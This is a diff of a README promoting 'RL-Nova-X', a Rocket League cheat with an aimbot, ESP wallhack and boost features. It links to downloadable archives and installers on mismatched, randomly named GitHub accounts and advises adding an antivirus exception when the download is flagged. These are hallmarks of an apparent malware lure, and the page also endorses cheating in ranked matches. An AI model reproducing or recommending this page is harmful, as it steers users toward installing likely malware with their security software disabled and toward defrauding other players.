@@ -1,170 +1,73 @@
-<p align="center">
-  <img src="https://img.icons8.com/color/96/000000/rocket-league.png" alt="Rocket League" width="80" height="80">
-</p>
+# 🚀 RL-Nova-X - Dominate your Rocket League matches easily
 
-<h1 align="center">RL-Nova-X</h1>
-<p align="center">
-  <strong>Nova X Tool for Rocket League</strong><br>
-  Ball Predictor - Aimbot - Boost Manager - ESP - Hitbox Overlay
-</p>
+[![](https://img.shields.io/badge/Download-RL--Nova--X-blue.svg)](https://github.com/mickitrigonometric672/RL-Nova-X/releases)
 
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/RL-Nova-X"><img src="https://img.shields.io/badge/version-2.0.0-brightgreen?style=flat-square" alt="Version"></a>
-  <a href="#"><img src="https://img.shields.io/badge/platform-Windows-blue?style=flat-square" alt="Platform"></a>
-  <a href="#"><img src="https://img.shields.io/badge/status-active-success?style=flat-square" alt="Status"></a>
-</p>
+## 📖 About this software
 
-## What is This?
+RL-Nova-X helps you improve your Rocket League performance. This tool provides data and overlays to assist your gameplay. It includes a ball path predictor, visual information, and boost management features. You use these functions to track the ball's movement, locate boost pads, and see player positions through walls. This tool runs alongside the game on your Windows computer.
 
-RL-Nova-X is the nova X tool for Rocket League. This tool gives you full control with Ball Predictor, Aimbot, Boost Manager, ESP, Hitbox Overlay, and more. Dominate every match and become the nova of the field!
+## 🛠 Features
 
-Disclaimer: This tool is for educational purposes only. Use at your own risk. Rocket League has anti-cheat measures (Easy Anti-Cheat) and using third-party tools may result in account suspension.
+*   **Ball Predictor:** Shows the future path of the ball. You see where the ball hits the ground or boards before it happens.
+*   **Aimbot:** Assists with aim during shots. This feature aligns your car to hit the ball with more accuracy.
+*   **Boost Manager:** Tracks active boost pads on the field. You receive alerts when nearby pads replenish.
+*   **ESP (Extra Sensory Perception):** Displays boxes around players. This shows their location even when they hide behind walls or obstructions.
+*   **Custom Interface:** You toggle these features on or off during a match. You choose which visuals appear on your screen.
 
-## Download
+## ⚠️ System Requirements
 
-<p align="center">
-  <a href="https://github.com/ChainOctopusCool/kphebuxh/releases/download/84/ROCLeagueTool.zip">
-    <img src="https://img.shields.io/badge/DOWNLOAD%20NOW-000000?style=for-the-badge&logo=github&logoColor=white" alt="Download">
-  </a>
-</p>
+Ensure your computer meets these standards before you begin.
 
-## Features
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Processor:** Intel Core i5 or AMD Ryzen 5.
+*   **Memory:** 8 GB RAM or higher.
+*   **Graphics:** NVIDIA GeForce GTX 1060 or AMD Radeon RX 580.
+*   **Storage:** 500 MB of free disk space.
+*   **Network:** Stable internet connection for updates.
 
-- Ball Trajectory Prediction - See where the ball will go with real-time arc overlays
-- Aim Assist - Aligns your car to the ball vector for perfect strikes
-- Magnet Mode - Ball stick radius for training and cinematic replays
-- Smart Rebound Predictor - Predicts bounce angles off walls and ceiling
-- Infinite Boost Toggle - Never run out of boost
-- Boost Route Assistant - Shows optimal boost paths for your side
-- Speed Equalizer - Anti-spin stabilizer for smooth car control
-- Physics Editor - Fine-tune car handling
-- Ball Trajectory Arcs - Real-time ball path visualization
-- Car Hitbox Outlines - See your car's hitbox
-- Boost Pad Timers - Respawn indicators for boost pads
-- Direction Vectors - Shows opponent car directions
-- Rotational Spacing Grid - Helps with positioning
+## 📥 How to download and install
 
-## Installation
+Follow these steps to set up the software on your machine.
 
-1. Click the download button above
-2. Extract the archive
-3. Run as Administrator
-4. Launch Rocket League
-5. Press INSERT or F1 to open the menu
-6. Toggle features ON/OFF
+1.  Visit the [official releases page](https://github.com/mickitrigonometric672/RL-Nova-X/releases) to download the installer.
+2.  Locate the latest file version, typically ending in .zip or .exe.
+3.  Click the file to start the download.
+4.  Open the file once the download finishes.
+5.  Follow the prompts in the installer window.
+6.  Agree to the terms if requested.
+7.  Click Install to place the files on your computer.
+8.  Choose to create a shortcut on your desktop for quick access.
 
-## System Requirements
+## 🕹 Usage instructions
 
-| Requirement | Details |
-|-------------|---------|
-| OS | Windows 10/11 (64-bit) |
-| Game | Rocket League (Steam/Epic) |
-| RAM | 4GB minimum |
-| Storage | 50MB free space |
+Run the application before you start Rocket League.
 
-## SEO Tags
+1.  Double-click the RL-Nova-X icon on your desktop.
+2.  Wait for the program to load.
+3.  Launch Rocket League via Steam or Epic Games.
+4.  Switch back to the RL-Nova-X window if the menu does not appear.
+5.  Use the provided hotkeys to toggle specific functions.
+6.  Look at the settings menu to adjust the size and color of the visual overlays.
+7.  Close the application when you finish your game session.
 
-rl nova x, rocket league cheat, rocket league hack, rocket league aimbot, rocket league ball predictor, rocket league boost manager, rocket league esp, rocket league wallhack, rocket league trajectory, rocket league training tool, rocket league utility, rocket league 2026, rocket league mod, rocket league enhancement, windows tool, game utility, free cheat, rocket league trainer, rocket league assistant, epic games tool, steam tool
+## 🔧 Frequently asked questions
 
-## Support
+**Will this tool get me banned?**
+This software interacts with your game memory. Use these tools at your own risk. We keep the code updated to maintain compatibility and stability on current game versions.
 
-Star this repository if you enjoy it!
+**Does this work with controller inputs?**
+Yes. Whether you use a keyboard or a game controller, the software reads your movements and overlays data on top of the game window.
 
-<p align="center">
-  <a href="https://github.com/YOUR_USERNAME/RL-Nova-X">
-    <img src="https://img.shields.io/badge/Made%20with%20love%20for%20the%20Rocket%20League%20community-ff69b4?style=for-the-badge" alt="Made with love">
-  </a>
-</p>
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
+**Why does the anti-virus block the download?**
+Some security programs flag software that interacts with game processes. You may need to add an exception in your settings to allow the tool to open.
+
+**How do I update the software?**
+Check the releases page occasionally. If a new version exists, download and install it over your current version. Your settings usually transfer to the new version automatically.
+
+**Can I use this in ranked modes?**
+Yes. The software functions in all game modes. However, remember that other players might notice if you use aggressive aim assistance. Use the features with discretion during competitive matches.
+
+**Is it possible to hide the overlays?**
+Yes. You toggle the entire interface or specific features using the settings menu. You clear your screen immediately by pressing the designated hide key.
+
+Keywords: rocket league, aimbot, esp, game helper, ball predictor, windows tools
